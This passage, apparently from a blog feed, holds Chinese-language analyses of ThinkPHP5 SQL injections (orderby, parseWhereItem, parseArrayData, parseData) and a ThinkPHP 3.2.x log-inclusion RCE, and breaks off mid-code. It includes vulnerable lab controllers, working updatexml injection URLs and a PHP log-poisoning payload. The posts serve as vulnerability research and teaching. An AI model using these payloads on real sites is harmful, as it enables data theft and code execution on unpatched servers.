alt="W0vVVx.png"></a></p><p>2.输入的orderby数组在order方法中被赋值给了<code>$this-&gt;options[&#39;order&#39;]</code></p><p><a href="https://imgtu.com/i/W0vZa6"><img src="https://z3.ax1x.com/2021/07/22/W0vZa6.png" alt="W0vZa6.png"></a></p><p>3.order方法结束后进入find，然后再调用think\db\connection\Mysql的find</p><p><a href="https://imgtu.com/i/W0vhQJ"><img src="https://z3.ax1x.com/2021/07/22/W0vhQJ.png" alt="W0vhQJ.png"></a></p><p>4.在think\db\connection\Mysql的find中，主要干了两件事</p><ul><li>select生成sql语句</li><li>query执行sql语句</li></ul><p>先来看select</p><p><a href="https://imgtu.com/i/W0v7o6"><img src="https://z3.ax1x.com/2021/07/22/W0v7o6.png" alt="W0v7o6.png"></a></p><p>5.select方法中取出了之前赋值给<code>$this-&gt;options[&#39;order&#39;]</code>的数组，也就是我们输入的orderby数组，然后传递给parseOrder。最后用str_replace替换模板生成sql语句</p><p><a href="https://imgtu.com/i/W0v1sA"><img src="https://z3.ax1x.com/2021/07/22/W0v1sA.png" alt="W0v1sA.png"></a></p><p>6.在parseOrder中，用户输入未经过任何过滤就拼接到sql语句中，只需要闭合掉在parseKey中拼接上的反引号即可。值得注意的是这里实际被拼接进sql语句的是传入orderby数组的键$key，数组的值最终传递给$sort然后被注释掉</p><p><a href="https://imgtu.com/i/W0vdzQ"><img src="https://z3.ax1x.com/2021/07/22/W0vdzQ.png" alt="W0vdzQ.png"></a></p><p>7.最后生成好的$sql被带入query执行</p><p><a href="https://imgtu.com/i/W0v6oV"><img src="https://z3.ax1x.com/2021/07/22/W0v6oV.png" alt="W0v6oV.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>需要注意下parseOrder中拼接sql语句的过程，理解为什么要把注入语句放在orderby数组的键中。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp5框架SQL注入分析：parseWhereItem</title>
    <link href="/2021/07/22/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseWhereItem/"/>
    <url>/2021/07/22/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseWhereItem/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞位置在Mysql类的parseWhereItem方法，select注入</p><p>漏洞影响版本： <strong>ThinkPHP5全版本</strong> 。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载源码</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.0.<span class="hljs-string">10 </span><span class="hljs-string">tp501</span><br></code></pre></td></tr></table></figure><p>创建数据库，在database.php配置连接信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> tpdemo1;<br><span class="hljs-keyword">use</span> tpdemo1;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">users</span>(<br><span class="hljs-keyword">id</span> <span class="hljs-built_in">int</span> primary <span class="hljs-keyword">key</span> auto_increment,<br>username <span class="hljs-built_in">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span><br>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span>,username) <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br></code></pre></td></tr></table></figure><p> /application/index/controller/Index.php </p><p>添加控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$username</span> = request()-&gt;get(<span class="hljs-string">&#x27;username&#x27;</span>);<br>        <span class="hljs-variable">$result</span> = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where(<span class="hljs-string">&#x27;username&#x27;</span>,<span class="hljs-string">&#x27;exp&#x27;</span>,<span class="hljs-variable">$username</span>)-&gt;select();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;select success&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">?username=) <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> <span class="hljs-title">updatexml</span>(1,<span class="hljs-title">concat</span>(0<span class="hljs-title">x7</span>,<span class="hljs-title">user</span>(),0<span class="hljs-title">x7e</span>),1)--+</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/Wwhk9K"><img src="https://z3.ax1x.com/2021/07/22/Wwhk9K.png" alt="Wwhk9K.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先在控制器这里打断点</p><p><a href="https://imgtu.com/i/WwhPtx"><img src="https://z3.ax1x.com/2021/07/22/WwhPtx.png" alt="WwhPtx.png"></a></p><p><code>/thinkphp/library/think/db/Query.php</code></p><p>调用parseWhereExp，然后返回$this</p><p><a href="https://imgtu.com/i/WwhCA1"><img src="https://z3.ax1x.com/2021/07/22/WwhCA1.png" alt="WwhCA1.png"></a></p><p><code>/thinkphp/library/think/db/Query.php</code></p><p>进入parseWhereExp，主要是对输入的查询表达式进行分析，然后赋值给$this-&gt;options[‘where’]</p><p><a href="https://imgtu.com/i/Wwhih6"><img src="https://z3.ax1x.com/2021/07/22/Wwhih6.png" alt="Wwhih6.png"></a></p><p><code>/thinkphp/library/think/db/Query.php</code></p><p>接下来进入select。</p><ol><li>首先调用parseExpress，功能是取出$this-&gt;options的值赋值给$options数组。</li><li>然后把$options数组作为参数传递给think\db\Builder类的select方法，生成sql语句。</li><li>最后调用query方法执行sql语句</li></ol><p><a href="https://imgtu.com/i/WwhA1O"><img src="https://z3.ax1x.com/2021/07/22/WwhA1O.png" alt="WwhA1O.png"></a></p><p>$options数组</p><p><a href="https://imgtu.com/i/WwhEcD"><img src="https://z3.ax1x.com/2021/07/22/WwhEcD.png" alt="WwhEcD.png"></a></p><p><code>/thinkphp/library/think/db/Builder.php</code></p><p>进入think\db\Builder类的select方法，用str_replace替换模板生成sql语句。这里详细看一下parseWhere方法</p><p><a href="https://imgtu.com/i/WwhVje"><img src="https://z3.ax1x.com/2021/07/22/WwhVje.png" alt="WwhVje.png"></a></p><p>经过一系列parseXXX方法后生成的sql语句</p><p><a href="https://imgtu.com/i/WwhmBd"><img src="https://z3.ax1x.com/2021/07/22/WwhmBd.png" alt="WwhmBd.png"></a></p><p><code>/thinkphp/library/think/db/Builder.php</code></p><p>由于$options[‘soft_delete’]为空，所以这里只执行了buildWhere。</p><p><a href="https://imgtu.com/i/WwhenH"><img src="https://z3.ax1x.com/2021/07/22/WwhenH.png" alt="WwhenH.png"></a></p><p>经过buildWhere后生成的whereStr</p><p><a href="https://imgtu.com/i/WwhnHA"><img src="https://z3.ax1x.com/2021/07/22/WwhnHA.png" alt="WwhnHA.png"></a></p><p>最后返回的结果就是$whereStr前面拼接上WHERE</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">WHERE ( <span class="hljs-string">`username`</span> ) <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> <span class="hljs-title">updatexml</span>(1,<span class="hljs-title">concat</span>(0<span class="hljs-title">x7</span>,<span class="hljs-title">user</span>(),0<span class="hljs-title">x7e</span>),1)--  )</span><br></code></pre></td></tr></table></figure><p><code>/thinkphp/library/think/db/Builder.php</code></p><p>进入buildWhere，看看sql语句具体是怎么拼接的</p><p>首先遍历$where也就是$options[‘where’]，然后把里面的值作为参数传入parseWhereItem</p><p><a href="https://imgtu.com/i/WwhKAI"><img src="https://z3.ax1x.com/2021/07/22/WwhKAI.png" alt="WwhKAI.png"></a></p><p><code>/thinkphp/library/think/db/Builder.php</code></p><p>在parseWhereItem中，直接拼接了sql语句</p><p><a href="https://imgtu.com/i/WwhMNt"><img src="https://z3.ax1x.com/2021/07/22/WwhMNt.png" alt="WwhMNt.png"></a></p><p>只要$exp等于EXP就会直接拼接sql语句</p><p><a href="https://imgtu.com/i/WwhQ4P"><img src="https://z3.ax1x.com/2021/07/22/WwhQ4P.png" alt="WwhQ4P.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><a href="https://imgtu.com/i/Wwh19f"><img src="https://z3.ax1x.com/2021/07/22/Wwh19f.png" alt="Wwh19f.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp5框架SQL注入分析：parseArrayData</title>
    <link href="/2021/07/20/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseArrayData/"/>
    <url>/2021/07/20/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseArrayData/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞位置在Mysql类的parseArrayData方法，update注入</p><p>漏洞影响版本： <strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong> (非最新的 <strong>5.1.8</strong> 版本也可利用)。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载源码</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.1.* <span class="hljs-string">tp517</span><br></code></pre></td></tr></table></figure><p>修改composer.json，然后执行 <code>composer update</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;require&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;php&quot;</span>: <span class="hljs-string">&quot;&gt;=5.6.0&quot;</span>,<br>    <span class="hljs-string">&quot;topthink/framework&quot;</span>: <span class="hljs-string">&quot;5.1.7&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>创建数据库，在database.php配置连接信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> tpdemo1;<br><span class="hljs-keyword">use</span> tpdemo1;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">users</span>(<br><span class="hljs-keyword">id</span> <span class="hljs-built_in">int</span> primary <span class="hljs-keyword">key</span> auto_increment,<br>username <span class="hljs-built_in">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span><br>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span>,username) <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br></code></pre></td></tr></table></figure><p> /application/index/controller/Index.php </p><p>添加控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$username</span> = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-number">1</span>])-&gt;update([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$username</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Update success&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/tp<span class="hljs-number">517</span>/public/?username[<span class="hljs-number">0</span>]=point&amp;username[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>&amp;username[<span class="hljs-number">2</span>]=updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)^&amp;username[<span class="hljs-number">3</span>]=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/Wtiryn"><img src="https://z3.ax1x.com/2021/07/20/Wtiryn.png" alt="Wtiryn.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><code>/thinkphp/library/think/db/Query.php</code></p><p>调用了$this-&gt;connection-&gt;update，也就是\think\db\connector\Mysql类的update</p><p><a href="https://imgtu.com/i/WtiwWQ"><img src="https://z3.ax1x.com/2021/07/20/WtiwWQ.png" alt="WtiwWQ.png"></a></p><p><code>/thinkphp/library/think/db/Conection.php</code></p><p>进入$this-&gt;builder-&gt;update，生成sql语句后带入execute执行</p><p><a href="https://imgtu.com/i/WticwV"><img src="https://z3.ax1x.com/2021/07/20/WticwV.png" alt="WticwV.png"></a></p><p><code>/thinkphp/library/think/db/Builder.php</code></p><p>先用parseData解析，再执行str_replace拼接update语句</p><p><a href="https://imgtu.com/i/Wti6e0"><img src="https://z3.ax1x.com/2021/07/20/Wti6e0.png" alt="Wti6e0.png"></a></p><p>最终生成的sql语句</p><p><a href="https://imgtu.com/i/WtisLq"><img src="https://z3.ax1x.com/2021/07/20/WtisLq.png" alt="WtisLq.png"></a></p><p><code>/thinkphp/library/think/db/Builder.php</code></p><p>再来看parseData，其中调用了parseArrayData</p><p><a href="https://imgtu.com/i/WtiDQs"><img src="https://z3.ax1x.com/2021/07/20/WtiDQs.png" alt="WtiDQs.png"></a></p><p><code>/thinkphp/library/think/db/Mysql.php</code></p><p>这里的$data就是payload中的username数组。list函数的功能是把数组中的值赋给一组变量 ，在这里就是把$data的前两位赋值给$type和$value，当$type也就是$data[0]为point时，按这种方式拼接sql语句</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-variable">$data</span><span class="hljs-selector-attr">[2]</span>(<span class="hljs-variable">$data</span><span class="hljs-selector-attr">[3]</span>(<span class="hljs-variable">$data</span><span class="hljs-selector-attr">[1]</span>))<br></code></pre></td></tr></table></figure><p>实际上就是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>[<span class="hljs-number">2</span>](username[<span class="hljs-number">3</span>](username[<span class="hljs-number">1</span>]))<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/Wti0zj"><img src="https://z3.ax1x.com/2021/07/20/Wti0zj.png" alt="Wti0zj.png"></a></p><p> $data就是我们传入的username数组</p><p><a href="https://imgtu.com/i/WtidJg"><img src="https://z3.ax1x.com/2021/07/20/WtidJg.png" alt="WtidJg.png"></a></p><p>parseArrayData返回的结果</p><p><a href="https://imgtu.com/i/WtiaFS"><img src="https://z3.ax1x.com/2021/07/20/WtiaFS.png" alt="WtiaFS.png"></a></p><p><code>/thinkphp/library/think/db/Conection.php</code></p><p>执行拼接好的sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-string">`users`</span>  <span class="hljs-keyword">SET</span> <span class="hljs-string">`username`</span> = updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)^(<span class="hljs-string">&#x27;0(1)&#x27;</span>)  <span class="hljs-keyword">WHERE</span>  <span class="hljs-string">`id`</span> = :where_AND_id  <br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WtigoT"><img src="https://z3.ax1x.com/2021/07/20/WtigoT.png" alt="WtigoT.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总结一下</p><p><a href="https://imgtu.com/i/WtiRFU"><img src="https://z3.ax1x.com/2021/07/20/WtiRFU.png" alt="WtiRFU.png"></a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp5框架SQL注入分析：parseData</title>
    <link href="/2021/07/19/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseData/"/>
    <url>/2021/07/19/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseData/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞位置在存在于 Builder 类的 parseData方法中，将可控参数未经过滤就拼接进了insert语句，造成SQL注入</p><p>漏洞影响版本： <strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong> 。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载源码</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.0.<span class="hljs-string">15 </span><span class="hljs-string">tpdemo</span><br></code></pre></td></tr></table></figure><p>修改composer.json中的require字段，然后执行<code>composer update</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;require&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;php&quot;</span>: <span class="hljs-string">&quot;&gt;=5.4.0&quot;</span>,<br>    <span class="hljs-string">&quot;topthink/framework&quot;</span>: <span class="hljs-string">&quot;5.0.15&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>创建数据库，然后在/application/database.php配置数据库连接信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> tpdemo;<br><span class="hljs-keyword">use</span> tpdemo;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">users</span>(<br><span class="hljs-keyword">id</span> <span class="hljs-built_in">int</span> primary <span class="hljs-keyword">key</span> auto_increment,<br>username <span class="hljs-built_in">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span><br>);<br></code></pre></td></tr></table></figure><p>/application/index/controller/Index.php</p><p>添加控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$username</span> = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;insert([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$username</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Update success&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>/application/config.php</p><p>把app_debug改成true</p><p><a href="https://imgtu.com/i/WGLTsJ"><img src="https://z3.ax1x.com/2021/07/19/WGLTsJ.png" alt="WGLTsJ.png"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/tpdemo/public/?username[<span class="hljs-number">0</span>]=inc&amp;username[<span class="hljs-number">1</span>]=updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)&amp;username[<span class="hljs-number">2</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WGLLIx"><img src="https://z3.ax1x.com/2021/07/19/WGLLIx.png" alt="WGLLIx.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><code>/thinkphp/library/think/db/Query.php</code></p><p>$this-&gt;builder等于think\db\builder\Mysql，调用的是think\db\builder\Mysql里的insert方法</p><p><a href="https://imgtu.com/i/WGLqd1"><img src="https://z3.ax1x.com/2021/07/19/WGLqd1.png" alt="WGLqd1.png"></a></p><p><code>/thinkphp/library/think/db/Builder.php</code></p><p>来到think\db\builder\Mysql的insert方法，进入parseData</p><p><a href="https://imgtu.com/i/WGL7L9"><img src="https://z3.ax1x.com/2021/07/19/WGL7L9.png" alt="WGL7L9.png"></a></p><p><code>/thinkphp/library/think/db/Builder.php</code></p><p>这里会对我们传入的username数组进行解析。先用switch case判断username[0]的值是exp、inc或者dec，然后再把username[1]也就是注入payload与操作符、username[2]进行拼接。</p><p><a href="https://imgtu.com/i/WGLXi6"><img src="https://z3.ax1x.com/2021/07/19/WGLXi6.png" alt="WGLXi6.png"></a></p><p>parseKey函数不会修改输入内容，最后返回的$result</p><p><a href="https://imgtu.com/i/WGLvRO"><img src="https://z3.ax1x.com/2021/07/19/WGLvRO.png" alt="WGLvRO.png"></a></p><p><code>/thinkphp/library/think/db/builder/Mysql.php</code></p><p>parseKey原封不动的返回了我们的payload</p><p><a href="https://imgtu.com/i/WGLjJK"><img src="https://z3.ax1x.com/2021/07/19/WGLjJK.png" alt="WGLjJK.png"></a></p><p><code>/thinkphp/library/think/db/Builder.php</code></p><p>回到think\db\builder\Mysql的insert方法，parseData解析完username数组后，执行str_replace把返回结果拼接到insert语句里</p><p><a href="https://imgtu.com/i/WGOSQe"><img src="https://z3.ax1x.com/2021/07/19/WGOSQe.png" alt="WGOSQe.png"></a></p><p>最终返回的结果</p><p><a href="https://imgtu.com/i/WGLxzD"><img src="https://z3.ax1x.com/2021/07/19/WGLxzD.png" alt="WGLxzD.png"></a></p><p><code>/thinkphp/library/think/db/Query.php</code></p><p>然后回到开始的insert，执行sql语句</p><p><a href="https://imgtu.com/i/WGOpsH"><img src="https://z3.ax1x.com/2021/07/19/WGOpsH.png" alt="WGOpsH.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>自己画了张流程图</p><p><a href="https://imgtu.com/i/WGO9Ld"><img src="https://z3.ax1x.com/2021/07/19/WGO9Ld.png" alt="WGO9Ld.png"></a></p><p>再参考下大佬的图</p><p><a href="https://imgtu.com/i/WGLbZR"><img src="https://z3.ax1x.com/2021/07/19/WGLbZR.png" alt="WGLbZR.png"></a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP3.2.x RCE漏洞分析</title>
    <link href="/2021/07/13/ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2021/07/13/ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>修改控制器</p><p>/Application/Home/Controller/IndexController.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"><span class="hljs-variable">$value</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-variable">$value</span>);<br>    <span class="hljs-keyword">$this</span>-&gt;display();<br>&#125;<br></code></pre></td></tr></table></figure><p>新建文件，内容随意</p><p>/Application/Home/View/Index/index.html</p><p><a href="https://imgtu.com/i/WksqJS"><img src="https://z3.ax1x.com/2021/07/13/WksqJS.png" alt="WksqJS.png"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>利用条件：assign方法的第一个变量可控。</p><p>向日志文件写入攻击代码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?m=<span class="hljs-comment">--&gt;&lt;?=phpinfo();?&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WksWxH"><img src="https://z3.ax1x.com/2021/07/13/WksWxH.png" alt="WksWxH.png"></a></p><p>包含日志文件，日志文件的命名规则为<code>年_月_日.log</code></p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-meta">index</span>.php?m=Home<span class="hljs-variable">&amp;c</span>=<span class="hljs-meta">Index</span><span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">index</span><span 